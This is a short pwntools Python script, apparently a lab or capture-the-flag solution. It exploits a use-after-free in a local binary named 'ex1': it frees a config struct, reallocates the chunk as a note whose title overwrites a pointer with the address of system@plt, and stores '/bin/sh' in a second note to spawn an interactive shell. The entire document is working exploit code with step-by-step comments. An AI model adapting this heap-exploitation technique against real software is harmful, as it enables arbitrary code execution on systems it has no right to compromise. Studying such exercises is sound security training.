#!/usr/bin/env python

from pwn import *

# struct note and struct config both have 64 bytes size
# We can allocate a note in `notes_create` -> `note_t *note = malloc(sizeof(note_t));`
# We can allogate a config in `configure` -> `CONFIG = malloc(sizeof(config_t));`
# We can only free a config
# Idea: create a CONFIG
# "Delete" the config (free the ptr)
# Create a note. The malloc for creating a note should return a pointer to the same chunk as the before CONFIG
# In the `title` section of the note, put the address of system@plt since the binary is compiled with `no-pie`

target = process("./bin/ex1")

# pwndbg> info address system@plt
# Symbol "system@plt" is at 0x401060 in a file compiled without debugging.

system_address = 0x401060

# Create a random CONFIG
target.sendline(b"4")
target.sendline(b"ceva.txt")

# Free the config for use-after-free
target.sendline(b"5")

# Create a note, use the same chunk as the config for a note
target.sendline(b"1")
# index 0 for note
target.sendline(b"0")
# title contains the address of system@plt + other 8 random bytes
payload = p64(system_address) + 8 * b'Z'
target.sendline(payload)
# content of note is irrelevant here
target.sendline(b"ALIN")

# Create another note with the title containing "/bin/sh"
target.sendline(b"1")
# index 1 for note
target.sendline(b"1")
# put "/bin/sh" in the title
target.sendline(b"/bin/sh\x00")
# content of the note is irrelevant here
target.sendline(b"ALIN")

# To activate the shell, read the note with index 1
target.sendline(b"2")
target.sendline(b"1")

target.interactive()